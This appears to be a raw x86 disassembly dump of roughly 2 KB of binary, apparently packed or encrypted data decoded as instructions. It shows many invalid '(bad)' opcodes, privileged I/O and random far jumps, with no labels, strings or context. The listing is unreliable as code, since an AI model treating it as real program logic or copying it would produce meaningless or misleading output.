  4176dc:	adc    DWORD PTR ds:0x4435b610,esi
  4176e2:	cmp    dl,BYTE PTR [eax+edx*4-0x8]
  4176e6:	mov    eax,ds:0x1c247d27
  4176eb:	mov    ecx,0xcd21b285
  4176f0:	(bad)  
  4176f1:	icebp  
  4176f2:	pusha  
  4176f3:	daa    
  4176f4:	mov    dl,0x56
  4176f6:	jno    0x4176d6
  4176f8:	and    eax,0xf2baa80b
  4176fd:	xchg   ecx,eax
  4176fe:	aad    0xfb
  417700:	(bad)  
  417701:	retf   
  417702:	shl    esp,0x82
  417705:	cmp    al,0x92
  417707:	out    0x87,al
  417709:	sti    
  41770a:	jns    0x41774b
  41770c:	mov    esp,DWORD PTR [esi+edi*4-0x56838337]
  417713:	or     BYTE PTR [eax+eax*4],0xbf
  417717:	mov    eax,0xf37eb18f
  41771c:	neg    BYTE PTR [ecx]
  41771e:	in     al,0xb6
  417720:	pop    es
  417721:	pop    ecx
  417722:	cmp    al,0xd0
  417724:	ins    DWORD PTR es:[edi],dx
  417725:	and    dh,bl
  417727:	cmp    ecx,DWORD PTR [esi]
  417729:	and    eax,0x34a5ac32
  41772e:	ror    DWORD PTR [ebp-0x4034762a],1
  417734:	test   dh,0xb2
  417737:	popf   
  417738:	pop    esp
  417739:	inc    esp
  41773a:	jle    0x4177ba
  41773c:	lock fiadd DWORD PTR [ebx+ebp*2+0x50c708a0]
  417744:	cmc    
  417745:	or     al,0x77
  417747:	xchg   ecx,eax
  417748:	mov    cl,0xfd
  41774a:	ds pop esp
  41774c:	inc    esp
  41774d:	jg     0x41777b
  41774f:	ss pop edx
  417751:	add    bh,al
  417753:	add    al,0xa4
  417755:	call   0xc0d8:0xe7ce107a
  41775c:	xchg   BYTE PTR [ebx],al
  41775e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41775f:	inc    edi
  417760:	and    cl,BYTE PTR [ecx]
  417762:	gs ret 
  417764:	test   DWORD PTR [ecx+0x25],eax
  417767:	xchg   ebx,eax
  417768:	fadd   QWORD PTR [ebp+0x639aea0a]
  41776e:	mov    dh,0x1e
  417770:	call   0x20d:0xcfdbd34
  417777:	lahf   
  417778:	adc    bl,BYTE PTR [edi]
  41777a:	jecxz  0x417799
  41777c:	cmp    BYTE PTR [esi],bl
  41777e:	rcl    DWORD PTR [ecx],cl
  417780:	jb     0x417720
  417782:	sbb    DWORD PTR [edi+0xa32c2cd],ebp
  417788:	shr    DWORD PTR [ebp+ebp*4+0x123c4185],1
  41778f:	or     eax,0x6d6d26df
  417794:	sub    al,0x38
  417796:	xchg   ebx,eax
  417797:	xor    DWORD PTR [edi],edx
  417799:	add    DWORD PTR [eax-0x27],ebx
  41779c:	sub    bl,ch
  41779e:	and    al,0x38
  4177a0:	sbb    BYTE PTR [ecx-0x40],0xba
  4177a4:	gs fs loope 0x417783
  4177a8:	gs stc 
  4177aa:	pusha  
  4177ab:	and    DWORD PTR [ecx+0x75a443e0],edx
  4177b1:	mov    ebx,0x44f78e92
  4177b6:	jge    0x417813
  4177b8:	sbb    ebx,DWORD PTR ds:0x78363a41
  4177be:	fxch   st(7)
  4177c0:	mov    bl,BYTE PTR [esi-0x51cba386]
  4177c6:	push   esi
  4177c7:	mov    BYTE PTR ds:0x7f0ee872,ah
  4177cd:	pop    eax
  4177ce:	or     edi,DWORD PTR [ebp+0x1a]
  4177d1:	out    dx,eax
  4177d2:	mov    eax,ds:0xb4284f5b
  4177d7:	fstp   DWORD PTR [edi]
  4177d9:	es mov esi,0x40a7193f
  4177df:	sbb    DWORD PTR [ebx+0xb],ecx
  4177e2:	rcl    BYTE PTR [ecx],1
  4177e4:	in     eax,0x7e
  4177e6:	test   al,0x64
  4177e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177e9:	pop    ebp
  4177ea:	sbb    BYTE PTR [ebx+edi*2-0x6a],dh
  4177ee:	adc    cl,BYTE PTR [ecx+0x69]
  4177f1:	(bad)  
  4177f2:	inc    edx
  4177f3:	mov    dl,0x41
  4177f5:	sti    
  4177f6:	inc    ebp
  4177f7:	mov    esi,0xf8333c6f
  4177fc:	mov    edx,0xa83a4870
  417802:	shl    BYTE PTR [ebx+0x65],1
  417805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417806:	jl     0x41784b
  417808:	xlat   BYTE PTR ds:[ebx]
  417809:	rcl    DWORD PTR [ecx-0x37612d25],0x8f
  417810:	xchg   ebx,eax
  417811:	inc    ebp
  417812:	sti    
  417813:	cdq    
  417814:	(bad)  
  417815:	pop    ebp
  417816:	lds    edx,FWORD PTR [eax-0xf1737b4]
  41781c:	jo     0x417815
  41781e:	xlat   BYTE PTR ds:[ebx]
  41781f:	push   ds
  417820:	iret   
  417821:	(bad)  ds:0x23a43558
  417827:	cmp    al,al
  417829:	or     al,0xc5
  41782b:	or     eax,0xdffce3e6
  417830:	mov    ecx,0x5baf2b6f
  417835:	out    0x96,eax
  417837:	bsf    esi,DWORD PTR [ebp+0x14]
  41783b:	inc    eax
  41783c:	scas   al,BYTE PTR es:[edi]
  41783d:	inc    edi
  41783e:	adc    BYTE PTR [ebx-0x23],ah
  417841:	add    BYTE PTR [eax-0x2b],0x50
  417845:	pop    ebp
  417846:	pop    esi
  417847:	out    dx,eax
  417848:	pop    es
  417849:	pop    esi
  41784a:	adc    ebx,DWORD PTR [eax+edx*2+0x61]
  41784e:	lds    ebp,FWORD PTR [ecx-0x3cf022f2]
  417854:	sbb    BYTE PTR fs:[ebp+0x4f],cl
  417858:	xchg   ecx,eax
  417859:	das    
  41785a:	mov    bh,0x4e
  41785c:	loope  0x417848
  41785e:	outs   dx,DWORD PTR ds:[esi]
  41785f:	xchg   ebp,eax
  417860:	sbb    edi,esi
  417862:	adc    ah,dl
  417864:	adc    edi,edx
  417866:	or     dh,BYTE PTR [ecx+0x2b]
  417869:	imul   ebx,DWORD PTR [ebx-0x4f4656c6],0xffffff88
  417870:	sbb    DWORD PTR [esi+0x52],eax
  417873:	dec    edx
  417874:	jmp    0x42c8:0xf92ee6a0
  41787b:	fcomi  st,st(2)
  41787d:	(bad)  
  41787e:	aad    0x63
  417880:	test   al,0xba
  417882:	neg    bl
  417884:	xor    edi,DWORD PTR [ebp-0x82a3768]
  41788a:	mov    ah,0xaa
  41788c:	pop    ds
  41788d:	mov    esp,0x88ae8537
  417892:	outs   dx,DWORD PTR ds:[esi]
  417893:	enter  0x8c53,0x1b
  417897:	dec    ecx
  417898:	jno    0x4178b7
  41789a:	je     0x41790c
  41789c:	inc    ecx
  41789d:	inc    ebx
  41789e:	xchg   esp,eax
  41789f:	nop
  4178a0:	add    al,0xf6
  4178a2:	adc    cl,ch
  4178a4:	and    eax,0xfe409652
  4178a9:	mov    eax,0xc4d5b562
  4178ae:	pop    esp
  4178af:	in     eax,0x9b
  4178b1:	add    al,0x6f
  4178b3:	inc    esp
  4178b4:	sti    
  4178b5:	add    ah,BYTE PTR [ecx+0x732f111f]
  4178bb:	push   edi
  4178bc:	js     0x4178f2
  4178be:	dec    ecx
  4178bf:	dec    eax
  4178c0:	retf   
  4178c1:	icebp  
  4178c2:	mov    bl,0xe4
  4178c4:	pop    es
  4178c5:	mov    dh,0xec
  4178c7:	xchg   edi,eax
  4178c8:	(bad)
  4178cb:	pop    edi
  4178cc:	xchg   ebx,eax
  4178cd:	dec    esi
  4178ce:	fst    DWORD PTR [edi-0x7f48370f]
  4178d4:	pop    edx
  4178d5:	sub    al,0xee
  4178d8:	popw   es
  4178da:	push   ds
  4178db:	push   ebp
  4178dc:	jecxz  0x417877
  4178de:	inc    edi
  4178df:	(bad)  
  4178e0:	adc    DWORD PTR [esi+0x64],esi
  4178e3:	int3   
  4178e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178e5:	xor    eax,0xd44adba
  4178ea:	lock mov edx,0xba1bf398
  4178f0:	fucom  st(7)
  4178f2:	pop    eax
  4178f3:	xchg   esp,eax
  4178f4:	fcmovne st,st(7)
  4178f6:	push   esp
  4178f7:	(bad)
  4178fc:	ins    DWORD PTR es:[edi],dx
  4178fd:	mov    ah,0x50
  4178ff:	push   0xffffffc3
  417901:	mov    al,ds:0x91e4be5c
  417906:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417907:	loope  0x4178a5
  417909:	mov    al,0xd5
  41790b:	(bad)  
  41790c:	adc    al,BYTE PTR [ebx+ebx*4]
  41790f:	add    bh,BYTE PTR [edx]
  417911:	in     al,0xe
  417913:	ds in  eax,0xed
  417916:	or     DWORD PTR [ecx-0x48],ecx
  417919:	cld    
  41791a:	jns    0x41796d
  41791c:	sub    bh,cl
  41791e:	(bad)  
  41791f:	cmc    
  417920:	sahf   
  417921:	push   esp
  417922:	nop
  417923:	jle    0x417913
  417925:	sub    al,0x8
  417927:	cmp    esi,DWORD PTR [esi-0x19]
  41792a:	es mov esp,0x7c0f525e
  417930:	sbb    eax,0x581361cd
  417935:	jecxz  0x4178f0
  417937:	sahf   
  417938:	cli    
  417939:	push   ebp
  41793a:	sbb    eax,0x1869e76d
  41793f:	mov    al,ds:0xc2a8cb53
  417944:	out    0xfc,al
  417946:	mov    esi,0xd0761fc1
  41794b:	lds    eax,FWORD PTR [ecx+edi*8+0x6a]
  41794f:	xchg   edx,eax
  417950:	mov    ecx,0x93794565
  417955:	jmp    0x1373:0x52d31da7
  41795c:	sub    eax,0xdc701577
  417961:	or     BYTE PTR [edi],0xd
  417964:	jno    0x417998
  417966:	enter  0xe447,0x43
  41796a:	outs   dx,DWORD PTR ds:[esi]
  41796b:	dec    eax
  41796c:	jg     0x4179ec
  41796e:	inc    esi
  41796f:	test   al,0x37
  417971:	add    BYTE PTR [edi],ah
  417973:	cs inc esi
  417975:	inc    ecx
  417976:	xchg   BYTE PTR [edx],bh
  417978:	fisttp QWORD PTR [eax-0x796a94c3]
  41797e:	fstp   DWORD PTR [ecx+eax*2+0xb19cd7c]
  417985:	inc    edx
  417986:	mov    esp,DWORD PTR [ebp+0x11c20376]
  41798c:	scas   al,BYTE PTR es:[edi]
  41798d:	xchg   DWORD PTR [ebp-0x49],edx
  417990:	retf   0x7042
  417993:	jg     0x4179f2
  417995:	lahf   
  417996:	in     eax,0xc0
  417998:	or     BYTE PTR [eax+0x41],cl
  41799b:	xchg   edi,eax
  41799c:	pop    esp
  41799d:	in     eax,dx
  41799e:	xor    al,0x8d
  4179a0:	cmc    
  4179a1:	adc    BYTE PTR [edx+0x40],dl
  4179a4:	xchg   esi,eax
  4179a5:	les    esi,FWORD PTR [eax-0x2a]
  4179a8:	sub    DWORD PTR [eax+0x3b],ebp
  4179ab:	sbb    DWORD PTR [edi+0x2d52a0a],esp
  4179b1:	push   ds
  4179b2:	add    dl,BYTE PTR [edx]
  4179b4:	arpl   WORD PTR [edx+0x12454d71],ax
  4179ba:	dec    esp
  4179bb:	call   0x9dcdf92b
  4179c0:	rcr    ch,0x7e
  4179c3:	(bad)  
  4179c4:	sub    DWORD PTR [ebx+0x1a],ebx
  4179c7:	inc    edi
  4179c8:	and    al,0x5d
  4179ca:	jge    0x4179ac
  4179cc:	push   ss
  4179cd:	xchg   edi,eax
  4179ce:	pop    ss
  4179cf:	add    ebp,ebx
  4179d1:	mov    bh,0x1e
  4179d3:	int3   
  4179d4:	ror    DWORD PTR [ebp+0x1e],cl
  4179d7:	add    al,0x99
  4179d9:	sub    BYTE PTR [edx-0x3643b16e],ch
  4179df:	popa   
  4179e0:	mov    esi,0xdb51f758
  4179e5:	std    
  4179e6:	sbb    al,0xde
  4179e8:	fld    DWORD PTR [eax+eiz*4+0x3d]
  4179ec:	out    0xe7,eax
  4179ee:	sbb    DWORD PTR [ebx+ebp*8-0x5c5748f7],0x4b42923
  4179f9:	push   esi
  4179fa:	inc    edx
  4179fb:	add    al,0x45
  4179fd:	push   ds
  4179fe:	pop    edi
  4179ff:	mov    esp,0xef728bbf
  417a04:	call   0x6d425fb
  417a09:	int3   
  417a0a:	mov    ecx,0xece575ef
  417a0f:	xchg   esi,eax
  417a10:	add    DWORD PTR [ebp+0x62],esp
  417a13:	mov    bl,0xcc
  417a15:	popf   
  417a16:	outs   dx,BYTE PTR ds:[esi]
  417a17:	sti    
  417a18:	mov    eax,0x680621f0
  417a1d:	fistp  DWORD PTR [esi-0xe]
  417a20:	cmc    
  417a21:	call   0x3c89c0c7
  417a26:	mov    ah,0x7e
  417a28:	fidiv  DWORD PTR [esi+ebx*4-0x7fb2f659]
  417a2f:	dec    eax
  417a30:	push   ebx
  417a31:	out    0xbe,eax
  417a33:	adc    edx,DWORD PTR [edx-0x5dbc8afc]
  417a39:	xchg   ecx,eax
  417a3a:	mov    BYTE PTR ds:0x724f0196,ah
  417a40:	daa    
  417a41:	fnstcw WORD PTR [edi-0x33]
  417a44:	or     DWORD PTR [ecx+0xe],ebp
  417a47:	mov    ebp,0xbadd7b25
  417a4c:	and    bh,BYTE PTR [edx]
  417a4e:	xchg   ecx,eax
  417a4f:	in     eax,dx
  417a50:	pop    esp
  417a51:	push   0x591ca2ac
  417a56:	pop    edi
  417a57:	ror    DWORD PTR [edi-0x13],cl
  417a5a:	pop    ds
  417a5b:	enter  0x3caf,0xb
  417a5f:	les    ecx,FWORD PTR ds:0xc2b14a78
  417a65:	adc    eax,0x4dfe99a0
  417a6a:	stos   DWORD PTR es:[edi],eax
  417a6b:	jl     0x417aca
  417a6d:	icebp  
  417a6e:	test   al,0x1e
  417a70:	int    0x19
  417a72:	test   DWORD PTR [esi+0x5c1ecbab],edx
  417a78:	sbb    eax,0x1ed4762e
  417a7d:	inc    edi
  417a7e:	xor    BYTE PTR [ebx-0x44d8c871],al
  417a84:	jmp    0xdf4412e9
  417a89:	jns    0x417a21
  417a8b:	xchg   BYTE PTR [ebx-0x54],al
  417a8e:	sub    DWORD PTR [ebx-0x43b51507],edi
  417a94:	mov    edi,0xc2080efd
  417a99:	mov    eax,ds:0x6d7bb52
  417a9e:	daa    
  417a9f:	inc    ebx
  417aa0:	mov    eax,0xeff279d3
  417aa5:	lock out dx,eax
  417aa7:	mov    edx,0xd4fc136c
  417aac:	dec    esp
  417aad:	sbb    edi,DWORD PTR [edi+0x58]
  417ab0:	jp     0x417ae0
  417ab2:	imul   dx,WORD PTR [esp+edx*2-0x4db4dc29],0x1e
  417abb:	jp     0x417af2
  417abd:	add    al,0xb6
  417abf:	mov    eax,ds:0xcddad7eb
  417ac4:	imul   ax,ax,0x3507
  417ac9:	fsubr  st(5),st
  417acb:	inc    esp
  417acc:	scas   eax,DWORD PTR es:[edi]
  417acd:	out    0x6a,al
  417acf:	sub    esi,0xffffffa7
  417ad2:	dec    esi
  417ad3:	or     eax,0x411c91c7
  417ad8:	xchg   esp,eax
  417ad9:	sbb    cl,BYTE PTR [esi]
  417adb:	call   0x16ffa5a3
  417ae0:	xor    eax,0xebc0092e
  417ae5:	mov    ch,BYTE PTR [eax-0x1b3aabda]
  417aeb:	mov    cl,0x4f
  417aed:	jge    0x417b0b
  417aef:	lahf   
  417af0:	repnz or eax,0x93d73c63
  417af6:	pop    ebp
  417af7:	aas    
  417af8:	dec    ebp
  417af9:	out    dx,eax
  417afa:	push   0x1a
  417afc:	mov    ebx,0x25ba1332
  417b01:	out    0x6f,eax
  417b03:	(bad)  
  417b04:	and    DWORD PTR [bx],0x426c495f
  417b0b:	outs   dx,DWORD PTR ds:[esi]
  417b0c:	mov    esp,0xba3ce263
  417b11:	xor    eax,0x76cff46e
  417b16:	mov    cl,0x8f
  417b18:	or     eax,DWORD PTR [ecx+0x71ad9589]
  417b1e:	push   ebx
  417b1f:	xlat   BYTE PTR ds:[ebx]
  417b20:	loopne 0x417b2e
  417b22:	aam    0x1b
  417b24:	leave  
  417b25:	(bad)  
  417b26:	adc    DWORD PTR [ebx+0x58],esi
  417b29:	pop    esp
  417b2a:	push   ecx
  417b2b:	ds mov edi,0x1c5c1e4c
  417b31:	or     edi,DWORD PTR [eax-0x60cff112]
  417b37:	xlat   BYTE PTR ds:[ebx]
  417b38:	cmp    eax,0xab7c750c
  417b3d:	dec    edi
  417b3e:	sub    BYTE PTR [edx],0x9a
  417b41:	xchg   ecx,eax
  417b42:	scas   eax,DWORD PTR es:[edi]
  417b43:	jl     0x417ac8
  417b45:	mov    ds:0xbcac4c74,al
  417b4a:	xchg   edx,eax
  417b4b:	test   BYTE PTR [ebx-0x80],ah
  417b4e:	xchg   BYTE PTR [ebp-0x7d],ch
  417b51:	ret    0xb2a8
  417b54:	repnz (bad) 
  417b56:	adc    eax,DWORD PTR [esi]
  417b58:	iret   
  417b59:	pop    ebp
  417b5a:	xchg   esp,ecx
  417b5c:	jno    0x417b48
  417b5e:	scas   eax,DWORD PTR es:[edi]
  417b5f:	mov    fs,WORD PTR [edi-0x27610141]
  417b65:	and    ah,ah
  417b67:	call   0xf51f:0x166b6e25
  417b6e:	inc    ecx
  417b6f:	adc    eax,0x16c5fae4
  417b74:	pop    ecx
  417b75:	rcr    DWORD PTR [ecx],1
  417b77:	add    esi,DWORD PTR [esi+0x19e6238e]
  417b7d:	imul   ecx,DWORD PTR [edx+edi*4-0x72],0xffffffdf
  417b82:	xor    esi,DWORD PTR [ebx-0x75e102da]
  417b88:	out    dx,al
  417b89:	loopne 0x417bc7
  417b8b:	or     eax,DWORD PTR [ebx+0x588b961f]
  417b91:	sbb    al,0x2
  417b93:	push   es
  417b94:	into   
  417b95:	dec    esp
  417b96:	pushf  
  417b97:	pop    ebx
  417b98:	shr    edi,cl
  417b9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b9b:	mov    eax,0x6aea0baf
  417ba0:	popf   
  417ba1:	push   es
  417ba2:	rol    BYTE PTR [ebx-0x74],1
  417ba5:	ins    BYTE PTR es:[edi],dx
  417ba6:	mov    ds:0x64742cbe,al
  417bab:	(bad)  
  417bac:	sti    
  417bad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bae:	hlt    
  417baf:	retf   0x4d62
  417bb2:	outs   dx,DWORD PTR ds:[esi]
  417bb3:	iret   
  417bb4:	dec    edx
  417bb5:	cmp    ebx,DWORD PTR [edx]
  417bb7:	adc    edi,DWORD PTR [esi-0x5d02507]
  417bbd:	adc    ecx,DWORD PTR [ebx+ebp*8-0x6f]
  417bc1:	add    BYTE PTR [ebx+ecx*8],0xa0
  417bc5:	pop    es
  417bc6:	mov    ah,0x10
  417bc8:	out    0x36,eax
  417bca:	cli    
  417bcb:	pop    ds
  417bcc:	hlt    
  417bcd:	sbb    eax,0x72e38172
  417bd2:	inc    esp
  417bd3:	adc    DWORD PTR [esi+0x6d],esp
  417bd6:	in     al,0x33
  417bd8:	fs call 0xb9f6:0xdb1b3197
  417be0:	out    0x35,al
  417be2:	adc    BYTE PTR [ebp-0x68da3687],al
  417be8:	imul   ebx,DWORD PTR [ebp+0x0],0xffffffcc
  417bec:	imul   edi,DWORD PTR [eax+0x2f],0xffffffbd
  417bf0:	jle    0x417b7c
  417bf2:	cmp    BYTE PTR [ebp+0x27070efb],0x48
  417bf9:	xchg   edi,eax
  417bfa:	iret   
  417bfb:	adc    DWORD PTR [ebx],ebx
  417bfd:	hlt    
  417bfe:	ror    bh,1
  417c00:	lea    ebx,[edi-0x27b4075e]
  417c06:	cmp    al,0xa9
  417c08:	jmp    0x764f:0x3c24fd0b
  417c0f:	loopne 0x417c36
  417c11:	pop    esp
  417c12:	jg     0x417c28
  417c14:	jmp    0x7cc1:0xe0925e66
  417c1b:	test   BYTE PTR [ecx],bl
  417c1d:	into   
  417c1e:	mov    DWORD PTR [eax+0x64],eax
  417c21:	jg     0x417bc8
  417c23:	add    al,0x11
  417c25:	adc    eax,0x55273ef6
  417c2a:	gs icebp 
  417c2c:	cld    
  417c2d:	(bad)  
  417c2e:	in     al,0x3e
  417c30:	lea    ebx,[edi*4+0x334c695c]
  417c37:	ret    0x4a62
  417c3a:	push   es
  417c3b:	sub    BYTE PTR [ecx-0x7c6d67a5],0xb8
  417c42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c43:	inc    ecx
  417c44:	lods   al,BYTE PTR ds:[esi]
  417c45:	or     BYTE PTR [eax+0x19095553],0x87
  417c4c:	xchg   ebp,eax
  417c4d:	mov    al,ds:0x63ad0f63
  417c52:	sub    DWORD PTR [ebp-0x17],ecx
  417c55:	shl    edx,1
  417c57:	in     eax,dx
  417c58:	je     0x417c0d
  417c5a:	ror    DWORD PTR [eax+0x1d7da9cf],1
  417c60:	loope  0x417c1b
  417c62:	shl    DWORD PTR [eax-0x49],cl
  417c65:	cmp    al,0x14
  417c67:	dec    edx
  417c68:	test   DWORD PTR [edx+0x23],edi
  417c6b:	fldenv [ebx+0x2d56cfdf]
  417c71:	cdq    
  417c72:	cdq    
  417c73:	pop    edi
  417c74:	xchg   DWORD PTR [ebp+0x77],edx
  417c77:	fcmovu st,st(1)
  417c79:	lea    ecx,[esp+edi*4]
  417c7c:	jno    0x417c96
  417c7e:	repz add BYTE PTR [si+0x1255],ch
  417c84:	xchg   ecx,eax
  417c85:	shr    BYTE PTR [ecx-0x189c4ef1],0x95
  417c8c:	sbb    BYTE PTR [edi-0x65cb6913],dh
  417c92:	std    
  417c93:	pop    ecx
  417c94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c95:	enter  0x69b8,0xa0
  417c99:	mov    esi,0xa469f1a8
  417c9e:	jp     0x417c6c
  417ca0:	test   al,0xec
  417ca2:	lds    esi,FWORD PTR [ecx]
  417ca4:	rol    BYTE PTR [edx+0x5d40d97f],0x8f
  417cab:	mov    dh,0xd7
  417cad:	lahf   
  417cae:	pop    edx
  417caf:	loope  0x417cc6
  417cb1:	(bad)  [eax]
  417cb3:	jp     0x417cf7
  417cb5:	jae    0x417cf9
  417cb7:	(bad)  
  417cb8:	loope  0x417cbe
  417cba:	or     BYTE PTR [ecx-0x7e],ch
  417cbd:	cwde   
  417cbe:	jmp    0x417cf4
  417cc0:	das    
  417cc1:	or     bh,BYTE PTR [ebp-0x72]
  417cc4:	mov    bl,BYTE PTR [esi+ebp*1]
  417cc7:	jl     0x417c4c
  417cc9:	jno    0x417cad
  417ccb:	or     BYTE PTR [edx+0x4d],bh
  417cce:	in     eax,0xd4
  417cd0:	out    0x38,al
  417cd2:	push   ebx
  417cd3:	push   eax
  417cd4:	int    0xa3
  417cd6:	ins    BYTE PTR es:[edi],dx
  417cd7:	fldcw  WORD PTR [esi]
  417cd9:	mov    dh,0xda
  417cdb:	out    0xa,al
  417cdd:	lahf   
  417cde:	leave  
  417cdf:	add    DWORD PTR [ebp+0x651da388],eax
  417ce5:	popf   
  417ce6:	fnstenv cs:[eax]
  417ce9:	mov    ebx,0x2ff1d61b
  417cee:	loope  0x417c86
  417cf0:	in     eax,dx
  417cf1:	test   eax,0x9a54dc6a
  417cf6:	mov    al,ds:0xdea4ab21
  417cfb:	ja     0x417c86
  417cfd:	out    dx,eax
  417cfe:	stos   DWORD PTR es:[edi],eax
  417cff:	cld    
  417d00:	ss add al,0xf6
  417d03:	dec    eax
  417d04:	call   0xe5cfe1d1
  417d09:	retf   
  417d0a:	xor    BYTE PTR [ebx-0x55],dh
  417d0d:	push   cs
  417d0e:	leave  
  417d0f:	std    
  417d10:	sahf   
  417d11:	jecxz  0x417caf
  417d13:	or     al,BYTE PTR [esi]
  417d15:	mov    dl,0xa9
  417d17:	add    esp,DWORD PTR [edi-0x22]
  417d1a:	pop    ebx
  417d1b:	pop    ds
  417d1c:	popa   
  417d1d:	inc    edi
  417d1e:	and    eax,0x26d6037c
  417d23:	fwait
  417d24:	pop    esi
  417d25:	pop    es
  417d26:	sar    DWORD PTR [ecx+0x5b],1
  417d29:	cs jmp 0x417cdb
  417d2c:	push   esi
  417d2d:	inc    edx
  417d2e:	jecxz  0x417d23
  417d30:	(bad)  
  417d31:	sub    eax,0xc83d7a16
  417d36:	popa   
  417d37:	not    DWORD PTR [ebx-0x2855734a]
  417d3d:	test   BYTE PTR [edi-0x7f47c772],dl
  417d43:	out    0x4,eax
  417d45:	dec    esp
  417d46:	adc    eax,0xafa114e0
  417d4b:	xchg   ebp,eax
  417d4c:	ror    bl,0xfc
  417d4f:	xor    DWORD PTR [ecx-0x69baf245],0x7192329b
  417d59:	and    al,al
  417d5b:	pop    ds
  417d5c:	outs   dx,DWORD PTR ds:[esi]
  417d5d:	cmp    eax,0x1880520d
  417d62:	(bad)  
  417d63:	clc    
  417d64:	or     eax,0x201d1355
  417d69:	mov    dl,0x52
  417d6b:	and    BYTE PTR [edi+0x8917b36],bl
  417d71:	pushf  
  417d72:	mov    al,0xf5
  417d74:	xor    al,0x50
  417d76:	cli    
  417d77:	repnz adc cl,BYTE PTR [esi-0x23471fa9]
  417d7e:	je     0x417d25
  417d80:	and    ecx,DWORD PTR [eax-0x25]
  417d83:	fmul   QWORD PTR [esi-0x4446cc04]
  417d89:	retf   
  417d8a:	ret    0x8fe6
  417d8d:	bound  ecx,QWORD PTR [esi+0x17625b71]
  417d93:	or     BYTE PTR [eax+0x5b],dh
  417d96:	dec    ebp
  417d97:	fwait
  417d98:	push   esp
  417d99:	ficom  WORD PTR [ebx+eiz*2+0x741b44ec]
  417da0:	aad    0x3b
  417da2:	in     eax,0xac
  417da4:	xchg   esi,eax
  417da5:	pop    ebx
  417da6:	mov    BYTE PTR [edx+ebx*2],cl
  417da9:	pop    ss
  417daa:	in     al,dx
  417dab:	inc    edi
  417dac:	push   ecx
  417dad:	cdq    
  417dae:	imul   eax,DWORD PTR [ebx-0xa],0xffffffcb
  417db2:	push   edx
  417db3:	out    0xf5,eax
  417db5:	test   BYTE PTR [esi-0x7a],cl
  417db8:	pop    ebx
  417db9:	cmp    eax,0xf9ab8eac
  417dbe:	shr    BYTE PTR [ebx+edi*1+0x7b],cl
  417dc2:	ds cwde 
  417dc4:	inc    eax
  417dc5:	mov    WORD PTR [ecx-0x6d6de916],es
  417dcb:	ret    
  417dcc:	mov    BYTE PTR [eax],cl
  417dce:	repz mov dh,0x9a
  417dd1:	xlat   BYTE PTR ds:[ebx]
  417dd2:	mov    ds:0xb519bdbf,eax
  417dd7:	xchg   edi,eax
  417dd8:	std    
  417dd9:	cmp    al,0x25
  417ddb:	aaa    
  417ddc:	inc    edx
  417ddd:	push   edi
  417dde:	add    dh,BYTE PTR cs:[ebx+ebx*4-0x2b]
  417de3:	sub    BYTE PTR [edi-0x2a813326],ch
  417de9:	(bad)  
  417dea:	fsub   DWORD PTR [ebx]
  417dec:	outs   dx,BYTE PTR ds:[esi]
  417ded:	add    eax,0xf3bb7d89
  417df2:	or     eax,ecx
  417df4:	cmp    DWORD PTR [esi+0x3f],esp
  417df7:	dec    eax
  417df8:	mov    esp,DWORD PTR [ecx*8+0x113837ce]
  417dff:	dec    ecx
  417e00:	test   DWORD PTR [eax+0x52],edx
  417e03:	sub    al,0xe6
  417e05:	test   eax,0x81c31b3d
  417e0a:	pop    ecx
  417e0b:	or     ah,BYTE PTR [edi+0x146effda]
  417e11:	sub    DWORD PTR [eax],edi
  417e13:	xchg   DWORD PTR fs:[ecx+0xc],edx
  417e17:	inc    ebx
  417e18:	jmp    0xf47c18c3
  417e1d:	ret    
  417e1e:	jmp    0xb954:0x31f7b2eb
  417e25:	dec    bp
  417e27:	xchg   edi,eax
  417e28:	or     DWORD PTR [edx],0x6b
  417e2b:	mov    fs,WORD PTR [esi+edi*2-0x6ffa452e]
  417e32:	jp     0x417e18
  417e34:	inc    edx
  417e35:	sbb    ebx,ebx
  417e37:	jge    0x417ea4
  417e39:	and    ch,cl
  417e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e3c:	dec    ecx
  417e3d:	inc    ebx
  417e3e:	cmp    eax,0x56401567
  417e43:	xchg   esp,eax
  417e44:	push   ecx
  417e45:	lock rol BYTE PTR [eax+eiz*8+0x11855e9a],0x23
  417e4e:	mov    cs,WORD PTR ss:[ebx-0x58fd2636]
  417e55:	dec    edx
  417e56:	sub    eax,0x45c3496f
  417e5b:	pop    ss
  417e5c:	je     0x417eb8
  417e5e:	xchg   ebp,esp
  417e60:	push   ebx
  417e61:	xchg   esi,eax
  417e62:	mov    ds:0x70454b84,eax
  417e67:	add    DWORD PTR [ecx],esi
  417e69:	sub    eax,0xb00a0d68
  417e6e:	(bad)  
  417e70:	mov    ebp,0x512b1c7f
  417e75:	and    ecx,edx
  417e77:	pop    edi
  417e78:	and    eax,0x913aafa5
  417e7d:	out    dx,eax
  417e7e:	xchg   DWORD PTR [esi],esi
  417e80:	nop
  417e81:	push   esi
  417e82:	sub    al,0xe
  417e84:	mov    ebp,0xfec10c6f
  417e89:	mov    dl,0x38
  417e8b:	push   ebx
  417e8c:	fld    st(2)
  417e8e:	pop    ds
  417e8f:	lea    ecx,[ecx-0x61fe6ae7]
  417e95:	(bad)  
  417e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e97:	inc    edi
  417e98:	pop    edx
  417e99:	push   esp
  417e9a:	sti    
  417e9b:	cmp    eax,0x2227cf34
  417ea0:	mov    dl,0xc7
  417ea2:	mov    al,0xab
  417ea4:	push   0x43ba2bac
  417ea9:	dec    ebx
  417eaa:	xor    ax,0x1f55
  417eae:	xor    bl,BYTE PTR [ecx+0x56]
  417eb1:	sub    bl,cl
  417eb3:	mov    edi,0xa6a676a1
  417eb8:	js     0x417eb4
  417eba:	sbb    al,0x4e
  417ebc:	cmp    eax,0x59fd5b20
  417ec1:	or     bl,cl
  417ec3:	pop    eax
  417ec4:	fld    DWORD PTR [ecx+0x35]
  417ec7:	xor    eax,0x2d4885ab
  417ecc:	inc    edi
  417ecd:	mov    bh,0x48
  417ecf:	call   0xac5f:0x2a524c6a
